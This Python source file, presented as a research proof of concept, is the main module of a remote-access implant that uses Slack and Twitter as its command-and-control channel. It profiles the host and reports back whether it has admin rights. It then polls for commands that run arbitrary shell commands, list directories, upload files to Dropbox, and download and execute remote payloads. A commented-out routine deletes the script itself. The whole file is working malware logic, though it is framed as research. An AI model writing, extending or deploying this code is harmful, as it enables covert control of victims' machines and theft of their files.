#!/usr/bin/env python
#
# Copyright 2019 Netskope, Inc.
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the
# following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following
# disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following
# disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote
# products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
# Written by Erick Galinkin
#
# This code is a proof of concept intended for research purposes only. It does not contain any payloads.  It is not
# weaponized.

import os
import platform
import getpass
import apis
import utils
import time


is_admin = True


def panic():
    exit(1)
    # Comment this out for now because development.
    # os.remove("urls.txt")
    # os.remove(sys.argv[0])


def whoami():
    current_user = getpass.getuser()
    return current_user


def host_info():
    hostname = platform.node()
    os_version = platform.platform()
    return hostname, os_version


def check_admin():
    global is_admin
    if os.name == 'nt':
        try:
            f = open("\\\\.\\PHYSICALDRIVE0")
            f.close()
            is_admin = True
            return "admin"
        except IOError:
            return "not admin"
    else:
        if os.getuid() == 0:
            is_admin = True
            return "admin"
        else:
            return "not admin"


def system_info():
    admin = check_admin()
    uname = whoami()
    cname, os_ver = host_info()
    sys_info = "Current user is {0}, username is: {1}        Computer name: {2}        OS version: {3}"\
        .format(admin, uname, cname, os_ver)
    return sys_info


def get_creds():
    """
    Function which will take no arguments, but look for API credentials which are stored on the internet.
    Unfortunately, this is the most recognizable and weakest part of the code, since it fetches the creds
    from the same places over and over again.
    TODO: Rework this so we're not hard-coding locations for API keys
    :return:
    API keys for whichever method should be tried next.
    """
    method, keys = apis.get_keys()
    if method is None:
        panic()

    return method, keys


def checkin(method, keys, sysinfo):
    if method == "Slack":
        return apis.slack_checkin(keys, sysinfo)
    if method == "Twitter":
        return apis.twitter_checkin(keys, sysinfo)


def get_commands(method, channel, keys):
    if method == "Slack":
        command = apis.slack_get_commands(channel, keys)
    elif method == "Twitter":
        command = apis.twitter_get_commands(keys)
    else:
        command = None
    return command


def parse_commands(commands, method, channel, keys):
    if commands is None:
        time.sleep(10)
        return True
    for command in commands:
        if command == "twitter_checkin":
            return True
        if command == "destroy":
            return False
        parsed_command = command.split(" ")
        command = parsed_command[0]
        if command == "cmd":
            args = parsed_command[1:]
            out = utils.run_command(args)
            if method == "Slack":
                apis.slack_post_to_channel(channel, keys, out)
            if method == "Twitter":
                apis.twitter_post_response(keys, out)
        if len(parsed_command) > 1:
            args = parsed_command[1]
        else:
            args = None
        if len(parsed_command) > 2:
            keys = parsed_command[2]
        if command in ["list_dir", "dropbox_upload", "fileio_dnexec", "dropbox_dnexec"]:
            if command == "list_dir":
                dir_listing = utils.dir_list(args)
                if method == "Slack":
                    apis.slack_post_to_channel(channel, keys, dir_listing)
                if method == "Twitter":
                    apis.twitter_post_response(keys, dir_listing)
            if command == "dropbox_upload":
                folder_name, _ = host_info()
                if "." in folder_name:
                    folder_name = folder_name.lower().split(".")[0]
                link = apis.dropbox_upload(keys, folder_name, args)
                if method == "Slack":
                    apis.slack_post_to_channel(channel, keys, link)
                if method == "Twitter":
                    apis.twitter_post_response(keys, link)
            if command == "fileio_dnexec":
                apis.fileio_download_exec(args)
            if command == "dropbox_dnexec":
                apis.dropbox_download_exec(keys, args)
    return True


def main():
    sys_string = system_info()
    method, keys = get_creds()
    cmd = checkin(method, keys, sys_string)
    if cmd is None:
        panic()
    if method == "Slack":
        cname, _ = host_info()
        if "." in cname:
            cname = cname.lower().split(".")[0]
        channel = apis.slack_create_channel(cname, keys)
    else:
        channel = None
    execute = parse_commands(cmd, method, channel, keys)
    while execute:
        cmd = get_commands(method, channel, keys)
        execute = parse_commands(cmd, method, channel, keys)


if __name__ == "__main__":
    main()
